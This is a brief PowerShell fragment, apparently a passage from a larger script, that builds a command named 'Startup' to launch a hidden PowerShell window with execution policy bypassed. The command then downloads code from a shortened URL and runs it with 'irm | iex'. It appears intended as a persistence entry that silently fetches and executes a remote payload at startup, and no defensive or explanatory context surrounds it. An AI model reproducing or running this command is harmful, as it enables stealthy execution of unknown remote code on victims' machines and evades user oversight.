...
$scriptName = "Startup"
$regCommand = "powershell -NoP -Ep Bypass -C `Start-Process powershell -ArgumentList '-NoP -Ep Bypass -W H -C `$expiryDateParam='$expiryDate'; irm https://shorturl.at/FkQqM | iex' -WindowStyle Hidden`"
